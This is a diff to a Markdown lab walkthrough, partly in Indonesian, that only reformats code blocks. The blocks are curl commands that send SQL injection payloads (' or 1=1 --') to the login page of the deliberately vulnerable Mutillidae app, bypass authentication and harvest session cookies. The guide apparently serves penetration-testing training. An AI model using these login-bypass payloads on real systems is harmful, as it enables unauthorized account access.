@@ -48,14 +48,14 @@
 ## Simulate CURL SQL Injection: (Obtain Access #1)
 1. Use Curl to Login with POST Data
    - Buka terminal, ketikkan perintah-perintah berikut : 
-``` 
-	curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1+--+&password=&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login1.txt
-``` 
+```bash
+curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1+--+&password=&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login1.txt
 ```
-	grep "Logged In" login1.txt
+```bash
+grep "Logged In" login1.txt
 ```
-```
-	cat crack_cookies.txt
+```bash
+cat crack_cookies.txt
 ```
    - Session cookies akan disimpan pada file crack_cookies.txt
 
@@ -86,26 +86,26 @@
 6. View Post Data (With Burpsuite)
    - cd /root
    - Jalankan perintah berikut
-```
+```bash
    grep -i cookie burp2.txt
 ```
-```
+```bash
    grep -i username burp2.txt
 ```
 
 Simulate cURL SQL Injection: (Obtain Access #2)
 1. Use Curl to Login with POST Data
    - Buka terminal, ketikkan perintah-perintah berikut : 
-``` 
+```bash 
 	rm crack_cookies.txt
 ```
-```
+```bash
 	curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
 ``` 
-```
+```bash
 	grep "Logged In" login2.txt
 ```
-```
+```bash
 	cat crack_cookies.txt
 ```
    - Session cookies akan disimpan pada file crack_cookies.txt
